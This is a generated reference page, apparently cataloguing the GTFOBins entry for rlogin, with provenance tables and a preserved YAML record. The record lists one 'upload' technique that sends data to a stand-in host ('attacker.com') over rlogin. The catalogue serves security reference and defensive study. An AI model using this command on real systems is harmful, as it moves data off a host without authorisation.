---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rlogin

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rlogin` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rlogin` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [rlogin](../../tools/linux/rlogin.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rlogin |
| name | rlogin |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/rlogin/ |

## Preserved Source Material

```yaml
_body: ''
_name: rlogin
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rlogin
functions:
  upload:
  - binary: false
    code: rlogin -l DATA -p 12345 attacker.com
    comment: The file is corrupted by leading and trailing spurious data.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
```
